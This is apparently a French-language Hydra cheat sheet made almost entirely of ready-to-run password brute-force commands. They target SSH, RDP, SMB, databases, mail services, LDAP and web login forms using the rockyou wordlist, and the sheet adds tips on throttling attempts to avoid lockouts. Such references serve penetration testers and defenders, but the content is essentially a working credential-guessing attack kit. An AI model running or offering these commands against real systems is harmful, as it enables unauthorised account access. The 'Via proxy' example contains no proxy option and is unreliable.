📋 Cheatsheet Hydra

Syntaxe de base

Syntaxe générale
# Format général
hydra -l utilisateur -P wordlist.txt protocole://IP
hydra -L users.txt -P passwords.txt protocole://IP

Flags principaux :
-l  — login unique
-L  — liste de logins
-p  — mot de passe unique
-P  — wordlist de mots de passe
-t  — threads (défaut 16)
-s  — port personnalisé
-v  — verbose
-V  — très verbose (voir chaque tentative)
-f  — stopper après premier succès
-o  — sortie dans fichier
-e nsr — tester null, same, reverse

Par protocole

SSH, FTP, Telnet, SMB, RDP
# SSH
hydra -l root -P rockyou.txt ssh://192.168.1.1
hydra -L users.txt -P rockyou.txt -t 4 ssh://192.168.1.1

# FTP
hydra -l admin -P rockyou.txt ftp://192.168.1.1

# Telnet
hydra -l admin -P rockyou.txt telnet://192.168.1.1

# SMB (Windows)
hydra -l administrator -P rockyou.txt smb://192.168.1.1

# RDP (Remote Desktop)
hydra -l administrator -P rockyou.txt rdp://192.168.1.1

# VNC
hydra -P rockyou.txt vnc://192.168.1.1
Bases de données & Services
# MySQL
hydra -l root -P rockyou.txt mysql://192.168.1.1

# PostgreSQL
hydra -l postgres -P rockyou.txt postgres://192.168.1.1

# MSSQL
hydra -l sa -P rockyou.txt mssql://192.168.1.1

# SMTP
hydra -l user@target.com -P rockyou.txt smtp://192.168.1.1

# POP3
hydra -l user -P rockyou.txt pop3://192.168.1.1

# IMAP
hydra -l user -P rockyou.txt imap://192.168.1.1

# Redis
hydra -P rockyou.txt redis://192.168.1.1

# LDAP
hydra -l "cn=admin,dc=target,dc=com" -P rockyou.txt ldap://192.168.1.1
HTTP — Formulaires web
# HTTP Basic Auth
hydra -l admin -P rockyou.txt http-get://192.168.1.1/admin

# HTTP POST Form (identifier le message d'échec !)
hydra -l admin -P rockyou.txt 192.168.1.1 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials"

# HTTPS POST Form
hydra -l admin -P rockyou.txt -s 443 192.168.1.1 https-post-form "/login:user=^USER^&pass=^PASS^:F=Wrong password"

# Avec cookie de session (CSRF token)
hydra -l admin -P rockyou.txt 192.168.1.1 http-post-form "/login:user=^USER^&pass=^PASS^:F=Error:H=Cookie: PHPSESSID=abc123"

# Format de la chaine http-post-form :
# "/chemin:corps_POST:message_echec"
# ^USER^ et ^PASS^ = variables Hydra
# F= = string indiquant un échec
# S= = string indiquant un succès

Options avancées

Options avancées
# Plusieurs cibles
hydra -l admin -P rockyou.txt -M targets.txt ssh

# Reprendre une session
hydra -R

# Tester null, same, reverse password
hydra -l admin -P rockyou.txt -e nsr ssh://192.168.1.1
# n=null password, s=same as login, r=reverse login

# Limiter les threads (éviter lockout)
hydra -l admin -P rockyou.txt -t 2 -w 30 ssh://192.168.1.1
# -w = temps d'attente entre tentatives

# Via proxy
hydra -l admin -P rockyou.txt -o results.txt -f ssh://192.168.1.1
🚫
Account Lockout : Soyez prudent avec le nombre de threads. Beaucoup de systèmes bloquent les comptes après 3-5 tentatives. Utilisez -t 2 et -w 30 pour ralentir l'attaque et éviter de bloquer les comptes légitimes.
